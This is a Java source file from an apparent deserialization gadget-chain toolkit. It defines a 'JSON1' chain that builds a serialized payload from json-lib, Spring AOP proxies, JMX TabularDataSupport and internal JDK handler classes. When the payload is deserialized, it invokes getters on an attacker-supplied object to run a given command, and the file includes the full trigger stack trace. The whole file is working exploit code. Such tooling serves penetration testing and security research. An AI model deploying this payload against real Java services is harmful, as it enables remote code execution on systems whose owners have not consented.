package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import javax.management.openmbean.CompositeData;
import javax.management.openmbean.CompositeType;
import javax.management.openmbean.OpenType;
import javax.management.openmbean.TabularDataSupport;
import javax.management.openmbean.TabularType;


import org.ses.gadgetbuilder.util.Reflections;
import org.springframework.aop.framework.AdvisedSupport;
import net.sf.json.JSONObject;

@Dependencies({ "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
        // deep deps
        "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6",
        "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
        "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
@Authors({ Authors.MBECHLER })
@Impact(Impact.MethodInvoke)
public class JSON1 extends MethodInvokeGadgetChain<EqualsTrampoline, GetterMethodInvokeAdapter> {

    public JSON1(EqualsTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final Object payload = this.methodInvokeAdapter.getInvocationTarget(command);

        CompositeType rt = new CompositeType("a", "b", new String[] {
                "a"
        }, new String[] {
                "a"
        }, new OpenType[] {
                javax.management.openmbean.SimpleType.INTEGER
        });
        TabularType tt = new TabularType("a", "b", rt, new String[] {
                "a"
        });
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);

        // we need to make payload implement composite data
        // it's very likely that there are other proxy impls that could be used
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);

        final Map<String, Object> s = new HashMap<String, Object>();
        s.put("getCompositeType", rt);
        InvocationHandler cdsInvocationHandler = (InvocationHandler) Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, s);

        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);

        System.out.println(Arrays.toString(payload.getClass().getInterfaces()));

        // Will call all getter methods on payload that are defined in the given interfaces
        ArrayList<Class> ifaces = new ArrayList<Class>();
        ifaces.add(CompositeData.class);
        for (Class clazz : payload.getClass().getInterfaces()) {
            for (Method method : clazz.getDeclaredMethods()) {
                if (method.getName().startsWith("get")) {
                    ifaces.add(clazz);
                    break;
                }
            }
        }

        final CompositeData cdsProxy = (CompositeData) Proxy.newProxyInstance(JSON1.class.getClassLoader(), ifaces.toArray(new Class[0]), invocationHandler);

        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
        //m.put("t", payload);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);

        return new TrampolineConnector(t1, t2);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "java.util.HashMap<K,V>.readObject(ObjectInputStream)\n"+
                "java.util.HashMap<K,V>.putVal(int, K, V, boolean, boolean)\n"+
                "javax.management.openmbean.TabularDataSupport.equals(Object)\n"+
                "javax.management.openmbean.TabularDataSupport.containsValue(CompositeData)\n"+
                "net.sf.json.JSONObject.containsValue(Object)\n"+
                "net.sf.json.JSONObject.containsValue(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject.processValue(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject._processValue(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject(AbstractJSON)._processValue(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject.fromObject(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject._fromBean(Object, JsonConfig)\n"+
                "net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)\n"+
                "org.apache.commons.beanutils.PropertyUtils.getProperty(Object, String)\n"+
                "org.apache.commons.beanutils.PropertyUtilsBean.getProperty(Object, String)\n"+
                "org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(Object, String)\n"+
                "org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(Object, String)\n"+
                "org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(Method, Object, Object[])\n"+
                "java.lang.reflect.Method.invoke(Object, Object...)\n"+
                "$Proxy0.getOutputProperties()\n"+
                "org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])\n"+
                "org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])\n"+
                "java.lang.reflect.Method.invoke(Object, Object...)";
    }
}
